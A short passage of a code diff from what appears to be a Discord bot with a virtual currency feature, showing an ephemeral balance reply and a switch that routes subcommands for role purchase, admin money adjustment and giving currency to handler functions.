+                    inline: true 
+                })
+                .setTimestamp();
+
+            await interaction.reply({ 
+                embeds: [balanceEmbed],
+                ephemeral: true
+            });
+            break;
+        case 'role-add':
+            await handleRoleAdd(interaction, userId, currentBalance);
+            break;
+        case 'add':
+            await handleAdminMoney(interaction, true);
+            break;
+        case 'remove':
+            await handleAdminMoney(interaction, false);
+            break;
+        case 'give':
+            await handleGive(interaction, userId, currentBalance);
+            break;
+    }
 }
 
 // --- ボットとサーバーの起動 ---
